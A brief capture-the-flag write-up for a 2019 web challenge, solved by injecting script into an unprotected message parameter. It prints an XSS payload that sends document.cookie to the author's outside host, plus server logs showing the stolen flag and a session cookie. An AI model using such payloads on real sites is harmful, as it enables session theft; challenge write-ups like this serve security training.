You need to get the flag from https://govagriculture.web.ctfcompetition.com/

- It seems as there is no XSS Protection, so i tryed following text:
> &lt;script&gt;
> var xhttp = new XMLHttpRequest();
> xhttp.open("GET", "https://mydomain.com/ctf", true);
> xhttp.send();
> &lt;/script&gt;

- Looking at the logs, I can see that the code is being executed:
> [22/Jun/2019:23:29:09 +0200] "GET /ctf HTTP/1.1" 200 8416 "https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript%3E%0D%0Avar+xhttp+%3D+new+XMLHttpRequest%28%29%3B%0D%0Axhttp.open%28%22GET%22%2C+%22https%3A%2F%2Fmydomain.com%2Fctf%22%2C+true%29%3B%0D%0Axhttp.send%28%29%3B%0D%0A%3C%2Fscript%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36"

- So lets try to get the cookies

> &lt;script&gt;
> var xhttp = new XMLHttpRequest();
> xhttp.open("GET", "https://mydomain.com/ctf?" + document.cookie, true);
> xhttp.send();
> &lt;/script&gt;

- An there is our flag in the logs:

> [22/Jun/2019:23:32:34 +0200] "GET /ctf?flag=CTF{8aaa2f34b392b415601804c2f5f0f24e};%20session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV HTTP/1.1" 200 8364 "https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript%3E%0D%0Avar+xhttp+%3D+new+XMLHttpRequest%28%29%3B%0D%0Axhttp.open%28%22GET%22%2C+%22https%3A%2F%2Fmydomain.com%2Fctf%3F%22+%2B+document.cookie%2C+true%29%3B%0D%0Axhttp.send%28%29%3B%0D%0A%3C%2Fscript%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36"

> CTF{8aaa2f34b392b415601804c2f5f0f24e}